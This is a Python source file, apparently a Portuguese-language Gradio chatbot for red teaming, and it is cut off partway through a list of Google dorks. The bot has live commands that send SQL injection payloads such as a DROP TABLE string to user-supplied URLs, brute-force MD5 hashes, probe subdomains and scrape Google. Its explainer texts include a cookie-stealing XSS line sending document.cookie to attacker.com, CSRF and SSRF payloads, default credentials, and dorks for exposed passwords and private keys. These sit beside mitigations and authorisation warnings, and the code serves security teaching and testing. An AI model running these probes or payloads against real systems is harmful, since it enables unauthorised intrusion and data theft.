#!/usr/bin/env python3
"""
RED-BOT - ChatBot especializado em Red Team e Ethical Hacking
Desenvolvido com Gradio para interface web interativa
"""

import gradio as gr
import aiohttp
import asyncio
import requests
from bs4 import BeautifulSoup
import hashlib
import itertools
import string
import time
import os
import logging
import json
from datetime import datetime
from typing import List, Dict, Tuple, Optional
import openai
from cachetools import TTLCache

class RedBot:
    def __init__(self):
        self.setup_logging()
        self.system_prompt = self.load_system_prompt()
        self.conversation_history = []
        self.openrouter_client = self.init_openrouter_client()
        self.feedback_file = "logs/feedback.json"
        self.last_message = ""
        self.last_response = ""
        self.ensure_logs_directory()

        # Performance optimizations
        self.http_session = None
        self.osint_cache = TTLCache(maxsize=100, ttl=3600)  # 1 hour cache
        self.hash_cache = TTLCache(maxsize=50, ttl=7200)   # 2 hour cache for hash results
        self.init_http_session()
        
    def load_system_prompt(self) -> Optional[str]:
        """Carrega o prompt do sistema do arquivo prompt.md"""
        try:
            with open('prompt.md', 'r', encoding='utf-8') as f:
                content = f.read()
                self.logger.info("Prompt do sistema carregado com sucesso")
                return content
        except FileNotFoundError:
            self.error_logger.error("Arquivo prompt.md não encontrado")
            return "Assistente especializado em Ethical Hacking e Red Team"

    def init_openrouter_client(self):
        """Inicializa cliente OpenRouter"""
        api_key = os.getenv('OPENROUTER_API_KEY')
        if not api_key:
            self.logger.warning("OPENROUTER_API_KEY não configurada. Usando modo rule-based.")
            return None

        try:
            client = openai.OpenAI(
                base_url="https://openrouter.ai/api/v1",
                api_key=api_key,
            )
            self.logger.info("Cliente OpenRouter inicializado com sucesso")
            return client
        except Exception as e:
            self.error_logger.error(f"Erro ao inicializar OpenRouter: {e}")
            return None

    def setup_logging(self):
        """Configura sistema de logging"""
        # Criar diretório de logs
        os.makedirs('logs', exist_ok=True)

        # Configurar logger principal
        self.logger = logging.getLogger('redbot')
        self.logger.setLevel(logging.INFO)

        # Formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )

        # Handler para arquivo
        file_handler = logging.FileHandler('logs/redbot.log')
        file_handler.setLevel(logging.INFO)
        file_handler.setFormatter(formatter)

        # Handler para console
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.WARNING)
        console_handler.setFormatter(formatter)

        # Adicionar handlers
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

        # Loggers específicos
        self.chat_logger = logging.getLogger('redbot.chat')
        self.security_logger = logging.getLogger('redbot.security')
        self.error_logger = logging.getLogger('redbot.error')

        # Configurar handlers para loggers específicos
        for logger in [self.chat_logger, self.security_logger, self.error_logger]:
            logger.setLevel(logging.INFO)
            logger.addHandler(file_handler)
            logger.addHandler(console_handler)
            logger.propagate = False

        self.logger.info("Sistema de logging inicializado")

    def save_feedback(self, feedback_type: str, message: str = "", response: str = ""):
        """Salva feedback do usuário"""
        feedback_data = {
            "timestamp": datetime.now().isoformat(),
            "type": feedback_type,
            "message": message[:200],  # Limitar tamanho
            "response": response[:200]
        }

        try:
            # Carregar feedbacks existentes
            if os.path.exists(self.feedback_file):
                with open(self.feedback_file, 'r', encoding='utf-8') as f:
                    feedbacks = json.load(f)
            else:
                feedbacks = []

            feedbacks.append(feedback_data)

            # Salvar
            with open(self.feedback_file, 'w', encoding='utf-8') as f:
                json.dump(feedbacks, f, indent=2, ensure_ascii=False)

            self.logger.info(f"Feedback salvo: {feedback_type}")

        except Exception as e:
            self.error_logger.error(f"Erro ao salvar feedback: {e}")

    def ensure_logs_directory(self):
        """Garante que o diretório de logs existe"""
        os.makedirs('logs', exist_ok=True)

    def init_http_session(self):
        """Inicializa sessão HTTP otimizada com connection pooling"""
        import aiohttp
        self.http_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(
                limit=10,  # Connection pool limit
                limit_per_host=5,  # Per host limit
                ttl_dns_cache=300,  # DNS cache TTL
                use_dns_cache=True
            ),
            timeout=aiohttp.ClientTimeout(
                total=30,    # Total timeout
                connect=10,  # Connection timeout
                sock_read=10 # Socket read timeout
            )
        )
    
    async def osint_google_dorking_async(self, query: str) -> List[str]:
        """Realiza Google Dorking para OSINT de forma assíncrona com cache"""
        # Check cache first
        cache_key = f"osint_{hash(query)}"
        if cache_key in self.osint_cache:
            self.logger.info(f"OSINT cache hit for query: {query[:50]}...")
            return self.osint_cache[cache_key]

        # Fallback to synchronous requests if async session not available
        if self.http_session is None:
            return self._osint_google_dorking_sync(query)

        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            }
            url = f"https://www.google.com/search?q={query}"

            async with self.http_session.get(url, headers=headers) as response:
                response.raise_for_status()
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')

                results = []
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if 'url?q=' in href and 'google.com' not in href:
                        clean_url = href.split('url?q=')[1].split('&')[0]
                        results.append(clean_url)

                results = results[:10]
                # Cache the results
                self.osint_cache[cache_key] = results
                self.logger.info(f"OSINT query cached: {query[:50]}... ({len(results)} results)")
                return results

        except Exception as e:
            error_msg = f"Erro na busca: {str(e)}"
            self.osint_cache[cache_key] = [error_msg]  # Cache error to avoid repeated failures
            return [error_msg]

    def _osint_google_dorking_sync(self, query: str) -> List[str]:
        """Fallback synchronous OSINT search"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            }
            url = f"https://www.google.com/search?q={query}"
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            results = []
            for link in soup.find_all('a', href=True):
                href = link['href']
                if 'url?q=' in href and 'google.com' not in href:
                    clean_url = href.split('url?q=')[1].split('&')[0]
                    results.append(clean_url)

            return results[:10]
        except Exception as e:
            return [f"Erro na busca: {str(e)}"]

    def osint_google_dorking(self, query: str) -> List[str]:
        """Realiza Google Dorking para OSINT (wrapper síncrono)"""
        # Run async function in event loop
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(self.osint_google_dorking_async(query))
            loop.close()
            return result
        except Exception as e:
            return [f"Erro na busca: {str(e)}"]
    
    def test_sql_injection(self, url: str, payloads: List[str]) -> Dict:
        """Testa vulnerabilidades de SQL Injection"""
        vulnerabilities = []
        try:
            for payload in payloads:
                test_url = f"{url}?id={payload}"
                response = requests.get(test_url, timeout=5)
                
                error_patterns = [
                    'error', 'syntax', 'mysql', 'postgresql', 'oracle',
                    'sql', 'database', 'warning', 'fatal'
                ]
                
                for pattern in error_patterns:
                    if pattern in response.text.lower():
                        vulnerabilities.append({
                            'payload': payload,
                            'response_length': len(response.text),
                            'status_code': response.status_code
                        })
                        break
            
            return {
                'url': url,
                'vulnerabilities_found': len(vulnerabilities),
                'details': vulnerabilities
            }
        except Exception as e:
            return {'error': str(e)}
    
    def brute_force_hash(self, target_hash: str, charset: Optional[str] = None, max_length: int = 6) -> str:
        """Quebra hash MD5 usando força bruta"""
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        for length in range(1, max_length + 1):
            for attempt in itertools.product(charset, repeat=length):
                guess = ''.join(attempt)
                guess_hash = hashlib.md5(guess.encode()).hexdigest()
                if guess_hash == target_hash.lower():
                    return guess
                
                if length > 4:
                    time.sleep(0.001)
        
        return ""
    
    def find_subdomains(self, domain: str, wordlist: Optional[List[str]] = None) -> List[str]:
        """Encontra subdomínios usando lista de palavras"""
        if wordlist is None:
            wordlist = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging']

        subdomains = []
        for word in wordlist:
            subdomain = f"{word}.{domain}"
            try:
                response = requests.get(f"http://{subdomain}", timeout=3)
                if response.status_code == 200:
                    subdomains.append(subdomain)
            except:
                try:
                    response = requests.get(f"https://{subdomain}", timeout=3)
                    if response.status_code == 200:
                        subdomains.append(subdomain)
                except:
                    continue

        return subdomains

    def analyze_xss_vulnerability(self) -> str:
        """Analisa vulnerabilidades XSS e fornece explicações e mitigações"""
        response = """🛡️ **Análise de Vulnerabilidades XSS (Cross-Site Scripting)**

**Como funciona:**
O XSS ocorre quando uma aplicação web inclui entrada não confiável (como comentários de usuário) em sua saída HTML sem validação ou escape adequado. Um atacante pode injetar scripts maliciosos que são executados no navegador da vítima.

**Exemplo de exploração:**
```html
<!-- Payload XSS básico -->
<script>alert('XSS!')</script>

<!-- Payload mais avançado -->
<img src=x onerror="alert('XSS')">

<!-- Payload para roubo de cookies -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Como testar:**
1. Submeta payloads XSS em campos de entrada
2. Verifique se o payload é refletido na página sem sanitização
3. Teste em diferentes contextos (HTML, atributos, JavaScript)

**Mitigações:**
- **Output Encoding:** Sempre encode saída HTML usando bibliotecas como html.escape()
- **Content Security Policy (CSP):** Implemente headers CSP para restringir scripts
- **Input Validation:** Valide e sanitize todas as entradas
- **Framework Security:** Use frameworks que escapam automaticamente (React, Vue.js)

**Exemplo de código seguro em Python:**
```python
from html import escape

def safe_comment_display(comment):
    return f"<div>{escape(comment)}</div>"
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_api_data_exposure(self) -> str:
        """Analisa exposição de dados sensíveis via API"""
        response = """🔓 **Análise de Exposição de Dados Sensíveis via API**

**Como funciona:**
APIs que não exigem autenticação adequada podem expor dados confidenciais como emails, senhas hash, informações pessoais, etc.

**Exemplo de exploração:**
```bash
# Requisição sem autenticação
GET /api/user/profile?user_id=123 HTTP/1.1
Host: vulnerable-api.com

# Resposta pode conter dados sensíveis
{
  "email": "user@example.com",
  "ssn": "123-45-6789",
  "credit_card": "4111111111111111"
}
```

**Como testar:**
1. Identifique endpoints de API públicos
2. Teste acesso sem tokens de autenticação
3. Verifique se dados sensíveis são retornados

**Mitigações:**
- **Autenticação Obrigatória:** Exija tokens JWT, OAuth, ou API keys
- **Controle de Acesso:** Implemente RBAC (Role-Based Access Control)
- **Auditoria:** Log todas as requisições de API
- **Rate Limiting:** Limite requisições por usuário/IP

**Exemplo de implementação segura:**
```python
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)

def require_auth(f):
    def wrapper(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'error': 'Token required'}), 401
        try:
            jwt.decode(token, 'secret', algorithms=['HS256'])
        except:
            return jsonify({'error': 'Invalid token'}), 401
        return f(*args, **kwargs)
    return wrapper

@app.route('/api/user/<user_id>')
@require_auth
def get_user(user_id):
    # Só retorna dados se o usuário autenticado for o proprietário
    return jsonify(get_user_data_safe(user_id))
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_idor_vulnerability(self) -> str:
        """Analisa vulnerabilidades IDOR"""
        response = """🎯 **Análise de IDOR (Insecure Direct Object References)**

**Como funciona:**
Aplicações que não validam adequadamente o acesso a objetos permitem que usuários acessem recursos de outros usuários modificando parâmetros como IDs.

**Exemplo de exploração:**
```bash
# Usuário normal acessa seu perfil
GET /user/profile?id=123

# Atacante modifica o ID para acessar perfil de outro usuário
GET /user/profile?id=456

# Se não houver validação, dados do usuário 456 são retornados
```

**Como testar:**
1. Identifique endpoints que usam IDs de objeto
2. Modifique parâmetros (id, user_id, file_id, etc.)
3. Verifique se consegue acessar recursos de outros usuários

**Mitigações:**
- **Validação de Acesso:** Sempre verifique se o usuário tem permissão para o objeto
- **UUIDs ao invés de IDs sequenciais:** Use identificadores não previsíveis
- **Controle de Sessão:** Valide propriedade do objeto na sessão
- **Logs de Acesso:** Monitore tentativas de acesso não autorizado

**Exemplo de código seguro:**
```python
def get_user_profile(user_id, current_user):
    # Verifica se o usuário atual tem acesso ao perfil solicitado
    if user_id != current_user.id and not current_user.is_admin:
        raise PermissionError("Acesso negado")

    return get_profile_data(user_id)
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_csrf_vulnerability(self) -> str:
        """Analisa vulnerabilidades CSRF"""
        response = """🔄 **Análise de Vulnerabilidades CSRF (Cross-Site Request Forgery)**

**Como funciona:**
CSRF engana usuários autenticados para executar ações não intencionais em aplicações web onde estão logados.

**Exemplo de exploração:**
```html
<!-- Página maliciosa hospedada pelo atacante -->
<form action="https://vulnerable-site.com/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
</form>
<script>
    document.forms[0].submit();
</script>
```

**Como testar:**
1. Identifique ações state-changing (POST, PUT, DELETE)
2. Crie formulários HTML que submetam para esses endpoints
3. Verifique se a aplicação aceita requisições sem validação CSRF

**Mitigações:**
- **Tokens CSRF:** Inclua tokens únicos em formulários
- **SameSite Cookies:** Configure cookies com SameSite=Strict
- **Verificação de Origem:** Valide header Origin/Referer
- **CAPTCHA:** Para ações críticas

**Exemplo de implementação:**
```python
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
csrf = CSRFProtect(app)

@app.route('/change-password', methods=['POST'])
@csrf.exempt  # Só para exemplo - normalmente use @csrf.require
def change_password():
    token = request.form.get('csrf_token')
    if not validate_csrf_token(token):
        return "CSRF token inválido", 403
    # Processa mudança de senha
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_ssrf_vulnerability(self) -> str:
        """Analisa vulnerabilidades SSRF"""
        response = """🌐 **Análise de SSRF (Server-Side Request Forgery)**

**Como funciona:**
SSRF permite que atacantes façam requisições do servidor vulnerável para recursos internos ou externos não autorizados.

**Exemplo de exploração:**
```bash
# Upload de imagem com URL maliciosa
POST /upload-image
Content-Type: application/json

{
    "image_url": "http://localhost:8080/admin"
}

# Ou acesso a metadados AWS
{
    "image_url": "http://169.254.169.254/latest/meta-data/"
}
```

**Como testar:**
1. Encontre funcionalidades que fazem requisições HTTP (uploads, fetches)
2. Teste URLs que apontem para localhost, internal IPs, cloud metadata
3. Verifique se consegue acessar recursos internos

**Mitigações:**
- **Whitelist de URLs:** Permita apenas domínios confiáveis
- **Validação de Input:** Bloqueie URLs com localhost, 127.0.0.1, etc.
- **Network Segmentation:** Isole servidores de recursos sensíveis
- **Timeouts e Limits:** Configure timeouts curtos e limites de tamanho

**Exemplo de código seguro:**
```python
import ipaddress

def is_allowed_url(url):
    try:
        parsed = urlparse(url)
        ip = ipaddress.ip_address(parsed.hostname)

        # Bloqueia IPs privados e localhost
        if ip.is_private or ip.is_loopback:
            return False

        return parsed.hostname in ALLOWED_DOMAINS
    except:
        return False

def safe_fetch_image(url):
    if not is_allowed_url(url):
        raise ValueError("URL não permitida")

    response = requests.get(url, timeout=5)
    return response.content
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_broken_auth_reset(self) -> str:
        """Analisa autenticação quebrada em reset de senha"""
        response = """🔑 **Análise de Autenticação Quebrada em Reset de Senha**

**Como funciona:**
Processos de reset de senha vulneráveis permitem que atacantes assumam contas sem autorização adequada.

**Exemplo de exploração:**
```bash
# Reset sem verificação adequada
POST /reset-password
{
    "email": "victim@example.com",
    "new_password": "hacked123"
}

# Ou usando tokens previsíveis
GET /reset?token=12345&user_id=678
```

**Como testar:**
1. Teste resets sem verificação de identidade
2. Verifique se tokens são previsíveis ou não expiram
3. Teste rate limiting no processo de reset

**Mitigações:**
- **Verificação Multi-Fator:** Exija confirmação adicional (email, SMS)
- **Tokens Seguros:** Use tokens criptograficamente seguros com expiração curta
- **Rate Limiting:** Limite tentativas de reset por usuário
- **Logs de Segurança:** Monitore tentativas suspeitas

**Exemplo de implementação segura:**
```python
import secrets
from datetime import datetime, timedelta

def generate_reset_token():
    return secrets.token_urlsafe(32)

def send_reset_email(email):
    token = generate_reset_token()
    expires = datetime.now() + timedelta(hours=1)

    # Armazena token com expiração no banco
    store_reset_token(email, token, expires)

    # Envia email com link seguro
    send_email(email, f"/reset-password?token={token}")

def verify_reset_token(token):
    # Verifica se token existe e não expirou
    reset_data = get_reset_token_data(token)
    if not reset_data or datetime.now() > reset_data['expires']:
        return False
    return reset_data['email']
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_file_idor(self) -> str:
        """Analisa IDOR em uploads de arquivo"""
        response = """📁 **Análise de IDOR em Upload de Arquivos**

**Como funciona:**
Aplicações que não validam propriedade de arquivos permitem acesso não autorizado a arquivos de outros usuários.

**Exemplo de exploração:**
```bash
# Usuário A faz upload de arquivo, recebe ID 123
POST /upload
Content-Type: multipart/form-data
file: documento.pdf

# Resposta: {"file_id": 123}

# Usuário B tenta acessar arquivo do usuário A
GET /files/123

# Se não houver validação, arquivo é retornado
```

**Como testar:**
1. Faça upload de arquivo e obtenha ID
2. Tente acessar arquivos com IDs diferentes
3. Verifique se consegue baixar arquivos de outros usuários

**Mitigações:**
- **Validação de Propriedade:** Verifique se usuário é dono do arquivo
- **URLs Não Previsíveis:** Use UUIDs ao invés de IDs sequenciais
- **Controle de Acesso:** Implemente ACLs (Access Control Lists)
- **Logs de Acesso:** Monitore downloads de arquivos

**Exemplo de código seguro:**
```python
def download_file(user_id, file_id):
    # Verifica se o arquivo pertence ao usuário
    file_record = get_file_by_id(file_id)
    if file_record.owner_id != user_id:
        raise PermissionError("Acesso negado")

    return serve_file(file_record.path)
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_cors_misconfig(self) -> str:
        """Analisa configuração CORS mal configurada"""
        response = """🌍 **Análise de CORS Mal Configurado**

**Como funciona:**
Cross-Origin Resource Sharing (CORS) permite que sites façam requisições para outros domínios. Configurações permissivas demais podem levar a ataques.

**Exemplo de exploração:**
```javascript
// Site malicioso pode fazer requisições para API vulnerável
fetch('https://vulnerable-api.com/user/data', {
    method: 'GET',
    credentials: 'include'  // Inclui cookies
})
.then(response => response.json())
.then(data => {
    // Dados do usuário são roubados
    sendToAttacker(data);
});
```

**Headers CORS vulneráveis:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: *
```

**Como testar:**
1. Verifique headers CORS em respostas da API
2. Teste se `Access-Control-Allow-Origin: *` está presente
3. Verifique se credentials são permitidos com origens wildcard

**Mitigações:**
- **Origens Específicas:** Liste domínios permitidos explicitamente
- **Credentials Seguros:** Não use `credentials: true` com `*`
- **Validação de Origem:** Verifique header Origin no servidor
- **Mínimo Necessário:** Permita apenas métodos e headers necessários

**Exemplo de configuração segura:**
```javascript
// Servidor
const corsOptions = {
    origin: ['https://meusite.com', 'https://app.meusite.com'],
    credentials: true,
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
};
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_error_leakage(self) -> str:
        """Analisa vazamento de dados via mensagens de erro"""
        response = """🚨 **Análise de Vazamento de Dados em Mensagens de Erro**

**Como funciona:**
Mensagens de erro detalhadas podem expor informações sensíveis sobre a aplicação, banco de dados ou sistema.

**Exemplo de erro vulnerável:**
```
SQL Error: You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version
for the right syntax to use near '' UNION SELECT password FROM users--'
at line 1

Stack Trace:
/app/controllers/UserController.php:45
/app/models/User.php:123
/var/www/vendor/laravel/framework/src/Database/QueryException.php:78
```

**Informações que podem ser vazadas:**
- Estrutura do banco de dados
- Tecnologias utilizadas
- Caminhos do sistema de arquivos
- Chaves de API ou senhas
- Endereços IP internos

**Como testar:**
1. Provocque erros intencionalmente (URLs malformadas, inputs inválidos)
2. Analise mensagens de erro retornadas
3. Procure por informações sensíveis

**Mitigações:**
- **Mensagens Genéricas:** Use mensagens de erro padronizadas
- **Logs Separados:** Registre detalhes em logs, não mostre ao usuário
- **Configuração de Produção:** Desabilite debug em produção
- **Tratamento de Exceções:** Capture e sanitize todas as exceções

**Exemplo de tratamento seguro:**
```python
@app.errorhandler(Exception)
def handle_error(error):
    # Log detalhado para administradores
    logging.error(f"Error: {str(error)}", exc_info=True)

    # Resposta genérica para usuário
    return jsonify({
        "error": "Ocorreu um erro interno. Tente novamente mais tarde."
    }), 500
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def analyze_admin_panel(self) -> str:
        """Analisa painel admin mal configurado"""
        response = """🔐 **Análise de Painel Administrativo Mal Configurado**

**Como funciona:**
Painéis de administração sem proteções adequadas permitem acesso não autorizado a funções administrativas críticas.

**Vulnerabilidades comuns:**
- URLs previsíveis (`/admin`, `/admin.php`, `/wp-admin`)
- Autenticação fraca ou ausente
- Controle de acesso insuficiente
- Exposição de funcionalidades sensíveis

**Exemplo de exploração:**
```bash
# Tentativas comuns de acesso
GET /admin
GET /admin/login
GET /administrator
GET /wp-admin
GET /admin.php

# Credenciais padrão
admin:admin
admin:password
root:root
```

**Como testar:**
1. Procure por URLs comuns de admin
2. Teste credenciais padrão
3. Verifique se funções admin são acessíveis sem autenticação
4. Teste escalação de privilégios

**Mitigações:**
- **URLs Não Obvías:** Use caminhos não previsíveis
- **Autenticação Forte:** MFA obrigatório para admins
- **Controle de Acesso:** RBAC com mínimo privilégio
- **Monitoramento:** Logs detalhados de acesso admin
- **Rate Limiting:** Bloqueie tentativas de força bruta

**Exemplo de proteção:**
```python
from flask import Blueprint, session, abort

admin_bp = Blueprint('admin', __name__, url_prefix='/super-secret-admin-path')

@admin_bp.before_request
def require_admin():
    if not session.get('is_admin'):
        abort(403)

    # Log acesso admin
    logging.info(f"Admin access by user {session.get('user_id')}")

@admin_bp.route('/users')
def manage_users():
    # Só admins chegam aqui
    return render_template('admin/users.html')
```

⚠️ **Sempre teste apenas em sistemas autorizados!**"""
        return response

    def process_message(self, message: str, chat_history: List[List[str]]) -> Tuple[str, List[List[str]]]:
        """Processa mensagem do usuário e retorna resposta"""
        self.chat_logger.info(f"Mensagem recebida: {message[:100]}...")  # Log first 100 chars
        
        if message.startswith('/osint'):
            query = message.replace('/osint', '').strip()
            if query:
                results = self.osint_google_dorking(query)
                response = f"🔍 **Resultados OSINT para '{query}':**\n\n"
                for i, result in enumerate(results[:5], 1):
                    response += f"{i}. {result}\n"
            else:
                response = "❌ Uso: /osint <consulta de busca>"
        
        elif message.startswith('/sqltest'):
            parts = message.split()
            if len(parts) >= 2:
                url = parts[1]
                payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "1; DROP TABLE users--"]
                results = self.test_sql_injection(url, payloads)
                response = f"🛡️ **Teste SQL Injection em {url}:**\n\n"
                response += f"Vulnerabilidades encontradas: {results.get('vulnerabilities_found', 0)}\n"
                if results.get('details'):
                    response += "Payloads que causaram erros:\n"
                    for vuln in results['details'][:3]:
                        response += f"- {vuln['payload']}\n"
            else:
                response = "❌ Uso: /sqltest <URL>"
        
        elif message.startswith('/hashcrack'):
            parts = message.split()
            if len(parts) >= 2:
                target_hash = parts[1]
                self.security_logger.warning(f"Quebra de hash solicitada: {target_hash}")
                result = self.brute_force_hash(target_hash)
                if result:
                    response = f"🔓 **Hash quebrado!** Resultado: `{result}`"
                    self.security_logger.warning(f"Hash quebrado com sucesso: {target_hash} -> {result}")
                else:
                    response = "🔒 Hash não foi quebrado com os parâmetros atuais"
            else:
                response = "❌ Uso: /hashcrack <hash_md5>"
        
        elif message.startswith('/subdomain'):
            parts = message.split()
            if len(parts) >= 2:
                domain = parts[1]
                subdomains = self.find_subdomains(domain)
                response = f"🌐 **Subdomínios encontrados para {domain}:**\n\n"
                if subdomains:
                    for subdomain in subdomains:
                        response += f"✅ {subdomain}\n"
                else:
                    response += "Nenhum subdomínio encontrado"
            else:
                response = "❌ Uso: /subdomain <dominio.com>"
        
        elif message.startswith('/help'):
            response = """🤖 **RED-BOT - Comandos Disponíveis:**

**Comandos OSINT:**
• `/osint <consulta>` - Google Dorking
• `/subdomain <dominio>` - Busca subdomínios

**Comandos Web Security:**
• `/sqltest <URL>` - Teste SQL Injection

**Comandos Password Cracking:**
• `/hashcrack <hash>` - Quebra hash MD5

**Análise de Bug Bounty:**
• `/xss` - Análise de vulnerabilidades XSS
• `/api_exposure` - Exposição de dados via API
• `/idor` - Insecure Direct Object References
• `/csrf` - Cross-Site Request Forgery
• `/ssrf` - Server-Side Request Forgery
• `/auth_reset` - Autenticação quebrada em reset
• `/file_idor` - IDOR em uploads de arquivo
• `/cors` - CORS mal configurado
• `/error_leak` - Vazamento via mensagens de erro
• `/admin_panel` - Painel admin vulnerável

**Comandos Gerais:**
• `/help` - Mostra esta ajuda

**Exemplo de uso:**
```
 /osint site:exemplo.com filetype:pdf
 /sqltest http://exemplo.com/login
 /hashcrack 5d41402abc4b2a76b9719d911017c592
 /subdomain exemplo.com
 /xss
```

⚠️ **AVISO:** Use apenas em sistemas autorizados!"""

        elif message.startswith('/xss'):
            response = self.analyze_xss_vulnerability()

        elif message.startswith('/api_exposure'):
            response = self.analyze_api_data_exposure()

        elif message.startswith('/idor'):
            response = self.analyze_idor_vulnerability()

        elif message.startswith('/csrf'):
            response = self.analyze_csrf_vulnerability()

        elif message.startswith('/ssrf'):
            response = self.analyze_ssrf_vulnerability()

        elif message.startswith('/auth_reset'):
            response = self.analyze_broken_auth_reset()

        elif message.startswith('/file_idor'):
            response = self.analyze_file_idor()

        elif message.startswith('/cors'):
            response = self.analyze_cors_misconfig()

        elif message.startswith('/error_leak'):
            response = self.analyze_error_leakage()

        elif message.startswith('/admin_panel'):
            response = self.analyze_admin_panel()

        else:
            response = self.generate_response(message)
        
        chat_history.append([message, response])
        self.last_message = message
        self.last_response = response
        self.chat_logger.info(f"Resposta enviada: {response[:100]}...")
        return "", chat_history

    def give_positive_feedback(self):
        """Registra feedback positivo"""
        self.save_feedback("positive", self.last_message, self.last_response)
        self.logger.info("Feedback positivo recebido")

    def give_negative_feedback(self):
        """Registra feedback negativo"""
        self.save_feedback("negative", self.last_message, self.last_response)
        self.logger.info("Feedback negativo recebido")

    def generate_response(self, message: str) -> str:
        """Gera resposta usando OpenRouter API ou fallback rule-based"""

        # Tenta usar OpenRouter se disponível
        if self.openrouter_client:
            try:
                response = self.openrouter_client.chat.completions.create(
                    model="cognitivecomputations/dolphin-mistral-24b-venice-edition:free",
                    messages=[
                        {"role": "system", "content": self.system_prompt or "You are a helpful assistant."},
                        {"role": "user", "content": message}
                    ],
                    max_tokens=1000,
                    temperature=0.7
                )
                ai_response = response.choices[0].message.content or ""
                ai_response = ai_response.strip()

                # Adiciona aviso legal se não estiver presente
                if "⚠️" not in ai_response and "sempre" in ai_response.lower():
                    ai_response += "\n\n⚠️ **Lembre-se:** Sempre teste apenas em sistemas autorizados!"

                return ai_response

            except Exception as e:
                print(f"❌ Erro na API OpenRouter: {e}")
                # Fallback para modo rule-based

        # Fallback: Respostas rule-based
        message_lower = message.lower()

        if any(word in message_lower for word in ['python', 'código', 'script', 'programar']):
            response = """🐍 **Desenvolvimento Python para Red Team:**

Posso ajudar você com:
• Scripts de automação para testes de segurança
• Ferramentas de OSINT personalizadas
• Scanners de vulnerabilidade
• Ferramentas de força bruta
• Análise de logs e dados

**Exemplo - Scanner de portas simples:**
```
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

def scan_host(host, ports):
    with ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(lambda p: scan_port(host, p), ports)
    return [p for p in results if p is not None]
```

Digite `/help` para ver comandos disponíveis!"""

        elif any(word in message_lower for word in ['osint', 'informação', 'reconhecimento']):
            response = """🔍 **OSINT - Open Source Intelligence:**

**Técnicas principais:**
• Google Dorking para encontrar arquivos expostos
• Análise de metadados em documentos
• Busca em redes sociais e fóruns
• Consultas em bases de dados públicas (Shodan, Censys)

**Ferramentas recomendadas:**
• theHarvester - Coleta emails e subdomínios
• Maltego - Mapeamento de relacionamentos
• SpiderFoot - Automação de OSINT
• Shodan - Scanner de dispositivos IoT

**Google Dorks Collection by Jolanda de Koff:**

### **Search Filters & Operators**
| Filter | Description | Example |
|--------|-------------|---------|
| `allintext` | Searches for occurrences of all the keywords given | `allintext:"keyword"` |
| `intext` | Searches for the occurrences of keywords all at once or one at a time | `intext:"keyword"` |
| `inurl` | Searches for a URL matching one of the keywords | `inurl:"keyword"` |
| `allinurl` | Searches for a URL matching all the keywords in the query | `allinurl:"keyword"` |
| `intitle` | Searches for occurrences of keywords in title all or one | `intitle:"keyword"` |
| `allintitle` | Searches for occurrences of keywords all at a time | `allintitle:"keyword"` |
| `site` | Specifically searches that particular site and lists all the results for that site | `site:"www.google.com"` |
| `filetype` | Searches for a particular filetype mentioned in the query | `filetype:"pdf"` |
| `link` | Searches for external links to pages | `link:"keyword"` |
| `numrange` | Used to locate specific numbers in your searches | `numrange:321-325` |
| `before/after` | Used to search within a particular date range | `filetype:pdf & (before:2000-01-01 after:2001-01-01)` |
| `allinanchor` | Shows sites which have the keyterms in links pointing to them | `inanchor:rat` |
| `related` | List web pages that are "similar" to a specified web page | `related:www.google.com` |
| `cache` | Shows the version of the web page that Google has in its cache | `cache:www.google.com` |

### **Operators**
- **OR**: `site:facebook.com | site:twitter.com` - Search for either term
- **AND**: `site:facebook.com & site:twitter.com` - Both terms required
- **Include**: `-site:facebook.com +site:facebook.*` - Include specific results
- **Exclude**: `site:facebook.* -site:facebook.com` - Exclude specific results
- **Synonyms**: `~set` - Include synonyms of the word
- **Glob pattern**: `site:*.com` - Wildcard matching

### **Powerful Google Dorks Collection:**

#### **Database & Config Files**
```
"MySQL_ROOT_PASSWORD:" "docker-compose" ext:yml
!Host=*.* intext:enc_UserPassword=* ext:pcf
"-----BEGIN RSA PRIVATE KEY-----" ext:key
"-----BEGIN X509 CERTIFICATE-----" ext:pem -git
